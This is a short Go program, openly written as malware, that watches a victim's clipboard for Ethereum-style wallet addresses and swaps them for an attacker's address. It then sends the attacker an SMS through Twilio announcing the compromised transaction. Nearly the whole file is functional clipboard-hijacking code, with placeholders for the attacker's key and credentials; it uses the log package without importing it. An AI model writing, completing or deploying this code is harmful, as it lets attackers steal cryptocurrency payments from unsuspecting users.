package main

import (
	"github.com/atotto/clipboard"
	"github.com/sfreiberg/gotwilio"
	"regexp"
	"time"
)

//@latestTrigger contains the latest regex matched public key.
var latestTrigger string

//@maliciousKey contains the modified public key.
var maliciousKey string = "INSERT THE MALICIOUS PUBLIC KEY"

func main() {
	//Below controls ensure that the attack happens endlessly:
	for true {
		publicKeyAttack()
	}
}

//This function contains an attack combining the previously mentioned concepts.
func publicKeyAttack() {
	//@observer monitors the content of the clipboard.
	observer, err := clipboard.ReadAll()
	if err != nil {
		log.Fatalf("[!] clipboard.ReadAll() returned with code %s", err)
	}

	//@re contains the public key regex pattern.
	re := regexp.MustCompile(`^0x[a-fA-F0-9]{40}$`)

	//@trigger seeks to find a regex matching public key.
	trigger := string(re.Find([]byte(observer)))

	//Below controls ensure !empty clipboard and distinct public key notifications:
	if trigger != "" && latestTrigger != trigger {
		//notifyMe() sends a message containing the malicious key.
		notifyMe(maliciousKey)
		//clipboard.WriteAll() manipulates the clipboard content by copying the maliciousKey.
		clipboard.WriteAll(maliciousKey)
		//@latestTrigger updates the latest triggered regex matching public key.
		latestTrigger = trigger
		//time.Sleep() is a behavioral addition which ensures that the clipboard is not modified by the payload for at least x time.
		time.Sleep(360 * time.Second)
		//clipboard.WriteAll() empties the clipboard and prepares the loop to be continued.
		clipboard.WriteAll("")
	}
}

//This function notifies the attacker through text messaging.  
func notifyMe(maliciousKey string) {
	//Twilio API setup requirements:
	//@accountSid contains the Twilio account identifier.
	//@authToken contains the Twilio API authentication token.

	accountSid := "INSERT TWILIO ACCOUNT SID"
	authToken := "INSERT TWILIO AUTH TOKEN"
	twilio := gotwilio.NewTwilioClient(accountSid, authToken)

	//Text communication setup requirements:
	//@from contains the trial phone number. 
	//@to contains the real phone number.

	from := "INSERT TRIAL NUMBER"
	to := "INSERT REAL NUMBER"
	message := "You've Just Compromised A Cryptocurrency Transaction. Check The Following Wallet For New Assets:"

	twilio.SendSMS(from, to, message+maliciousKey, "", "")
}

